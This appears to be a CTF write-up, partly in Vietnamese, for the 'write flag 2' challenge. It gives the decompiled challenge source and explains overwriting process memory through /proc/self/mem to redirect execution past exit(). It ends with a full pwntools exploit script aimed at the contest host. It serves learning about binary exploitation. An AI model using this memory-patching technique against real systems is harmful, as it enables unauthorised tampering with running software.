# write flag 2
## Reference
https://ctftime.org/writeup/37328
## Source
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf[9]; // [rsp+0h] [rbp-70h] BYREF
  _DWORD n[3]; // [rsp+4Ch] [rbp-24h] BYREF
  int v6; // [rsp+58h] [rbp-18h]
  int v7; // [rsp+5Ch] [rbp-14h]
  int v8; // [rsp+60h] [rbp-10h]
  int v9; // [rsp+64h] [rbp-Ch]
  int v10; // [rsp+68h] [rbp-8h]
  int fd; // [rsp+6Ch] [rbp-4h]

  fd = open("/proc/self/maps", 0, envp);
  read(fd, maps, 0x1000uLL);
  close(fd);
  v10 = open("./flag.txt", 0);
  if ( v10 == -1 )
  {
    puts("flag.txt not found");
    return 1;
  }
  else
  {
    if ( read(v10, &flag, 0x80uLL) > 0 )
    {
      close(v10);
      v9 = dup2(1, 1337);
      v8 = open("/dev/null", 2);
      dup2(v8, 0);
      dup2(v8, 1);
      dup2(v8, 2);
      close(v8);
      alarm(0x3Cu);
      dprintf(
        v9,
        "Was that too easy? Let's make it tough\nIt's the challenge from before, but I've removed all the fluff\n");
      dprintf(v9, "%s\n\n", maps);
      while ( 1 )
      {
        memset(buf, 0, 64);
        v7 = read(v9, buf, 0x40uLL);
        if ( (unsigned int)__isoc99_sscanf(buf, "0x%llx %u", &n[1], n) != 2 || n[0] > 0x7Fu )
          break;
        v6 = open("/proc/self/mem", 2);
        lseek64(v6, *(__off64_t *)&n[1], 0);
        write(v6, &flag, n[0]);
        close(v6);
      }
      exit(0);
    }
    puts("flag.txt empty");
    return 1;
  }
}
```

## Ý tưởng
- Trên ida không hiện hết, tuy nhiên sau khi return còn một đoạn chương trình nữa

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/3420c3ac-51e0-409c-8ea7-ff13fb900771)

```
# [] After the exit there is more code
            sym.imp.dprintf(var_ch, "Somehow you got here??\n");
            uVar2 = sym.imp.abort();
```
- Vậy ta sẽ ghi flag vào chuỗi `Somehow...`. Tuy nhiên ta cần bybass qua `call exit`

- Ta có thể sử dụng `CTF` để tạo thành một hex và ghi đè vào mov edi, call exit
- Ta có `C = 0x43, T = 0x 54`, chúng ta có thể dùng 2 kí tự này để ghi đè call exit mà không làm chương trình bị lỗi
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/0800f65f-3682-4ed5-85c4-ab2666d23835)
- Tại sao phải là `CCCCT` mà không phải là đoạn chương trình ngắn hơn. 
- Vì `mov edi` đã là 5 byte và `call exit` cũng là 5 byte

## Khai thác

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('wfw2.2023.ctfcompetition.com', 1337)
else:
        p = process(exe.path)

# GDB()
offset_somehow = 0x20d5


p.recvlines(3)
exe.address = int("0x" + p.recv(12).decode(), 16)
info("exe base: " + hex(exe.address))

addr_mov_edi = exe.address + 0x143b
addr_call_exit = exe.address + 0x1440

# ghi đè chuỗi "Somehow" thành flag
p.sendline(hex(exe.address + 0x20d5) + " " + str(100))
sleep(1)
# ghi đè mov edi
p.sendline((hex(addr_mov_edi + 0)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 1)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 2)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_mov_edi + 3)) + " " + str(2))
sleep(1)

# ghi đè call exit

p.sendline((hex(addr_call_exit + 0)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 1)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 2)) + " " + str(1))
sleep(1)
p.sendline((hex(addr_call_exit + 3)) + " " + str(2))

sl("a") #exit

p.interactive()

```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/16438bae-b0c0-4d64-b573-52732e42ab35)
